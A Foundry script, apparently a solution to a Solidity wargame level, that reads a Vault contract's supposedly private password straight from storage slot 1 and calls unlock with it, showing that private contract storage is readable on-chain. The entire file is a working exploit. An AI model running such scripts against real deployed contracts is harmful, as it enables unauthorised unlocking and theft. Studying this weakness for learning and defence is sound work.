// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Script.sol';
import '../src/Vault.sol';

contract VaultScript is Script {
  Vault target = Vault(0xa77A6DC42Db1acf4950aCD049e3a108F456d8458);

  function run() external {
    vm.startBroadcast();
    bytes32 password = vm.load(address(target), bytes32(uint256(1)));
    target.unlock(password);
    console.log("Locked?", target.locked());
    vm.stopBroadcast();

  }
}
